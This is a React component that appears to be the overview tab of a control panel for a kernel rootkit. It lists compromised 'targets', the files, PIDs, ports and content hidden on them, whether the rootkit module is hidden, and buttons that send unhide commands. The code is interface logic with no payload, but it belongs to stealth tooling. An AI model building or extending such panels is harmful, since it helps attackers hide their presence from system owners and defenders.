import { Activity, FileText, Network, Search, Eye } from 'lucide-react'

function Section({ title, children }) {
  return (
    <div>
      <h3 className="text-xs font-bold uppercase tracking-widest text-fg-3 mb-3">{title}</h3>
      {children}
    </div>
  )
}

function InfoRow({ label, value, color }) {
  return (
    <div className="flex items-center justify-between px-4 py-2.5 border-b-2 border-border last:border-b-0">
      <span className="text-xs font-bold uppercase tracking-wider text-fg-3">{label}</span>
      <span className={`font-mono text-sm ${color || ''}`}>{value}</span>
    </div>
  )
}

export function OverviewTab({ target: t, cmd, busy }) {
  const hidden = {
    file: (t.hidden?.file || []).length,
    pid: (t.hidden?.pid || []).length,
    port: (t.hidden?.port || []).length,
    content: (t.hidden?.content || []).length,
  }
  const total = hidden.file + hidden.pid + hidden.port + hidden.content

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-0 h-full">
      <div className="border-b-2 lg:border-b-0 lg:border-r-2 border-border p-5 overflow-auto">
        <Section title={<>Hidden <span className="nb-badge bg-main text-main-fg ml-1">{total}</span></>}>
          {total > 0 && (
            <button className="nb-btn px-3 py-1.5 text-xs text-red mb-3" onClick={() => cmd('UNHIDE ALL')} disabled={!t.online || busy}>
              Unhide All
            </button>
          )}
          {total === 0 && (
            <div className="text-sm text-fg-3 py-4">Nothing hidden yet. Use the Processes, Ports, or Files tabs to hide items.</div>
          )}
          {[
            { key: 'file', label: 'Files', icon: FileText, items: t.hidden?.file || [], unhidCmd: 'UNHIDE FILE' },
            { key: 'pid', label: 'PIDs', icon: Activity, items: t.hidden?.pid || [], unhidCmd: 'UNHIDE PID' },
            { key: 'port', label: 'Ports', icon: Network, items: t.hidden?.port || [], unhidCmd: 'UNHIDE PORT' },
            { key: 'content', label: 'Content', icon: Search, items: t.hidden?.content || [], unhidCmd: 'UNHIDE CONTENT' },
          ].filter(c => c.items.length > 0).map(cat => (
            <div key={cat.key} className="mb-3">
              <div className="flex items-center gap-1.5 mb-1.5">
                <cat.icon size={12} className="text-fg-3" />
                <span className="text-[10px] font-bold uppercase tracking-widest text-fg-3">{cat.label}</span>
                <span className="text-[10px] font-mono text-fg-3">{cat.items.length}</span>
              </div>
              <div className="space-y-0.5">
                {cat.items.map((item, i) => (
                  <div key={i} className="flex items-center justify-between gap-2 px-3 py-1.5 rounded-[var(--radius)] bg-secondary border border-border group">
                    <span className="font-mono text-xs truncate">{item}</span>
                    <button
                      className="p-0.5 text-fg-3 hover:text-red opacity-0 group-hover:opacity-100 transition-opacity shrink-0"
                      title={`Unhide ${item}`}
                      onClick={() => cmd(`${cat.unhidCmd} ${i}`)}
                      disabled={!t.online || busy}
                    >
                      <Eye size={12} />
                    </button>
                  </div>
                ))}
              </div>
            </div>
          ))}
        </Section>
      </div>

      <div className="p-5 overflow-auto">
        <Section title="System">
          <div className="nb-card-flat overflow-hidden">
            <InfoRow label="Hostname" value={t.hostname || t.id} />
            <InfoRow label="ID" value={t.id} />
            <InfoRow label="Kernel" value={`${t.kernel} ${t.arch}`} />
            {t.build_id && <InfoRow label="Build" value={t.build_id} />}
            {t.peer && <InfoRow label="Peer" value={t.peer} />}
            <InfoRow label="Module" value={t.module_hidden ? 'Hidden' : 'Visible'} color={t.module_hidden ? 'text-green' : 'text-amber'} />
            <InfoRow label="Status" value={t.online ? 'Online' : 'Offline'} color={t.online ? 'text-green' : 'text-red'} />
            <InfoRow label="Hidden" value={`${total} items`} />
          </div>
        </Section>
      </div>
    </div>
  )
}
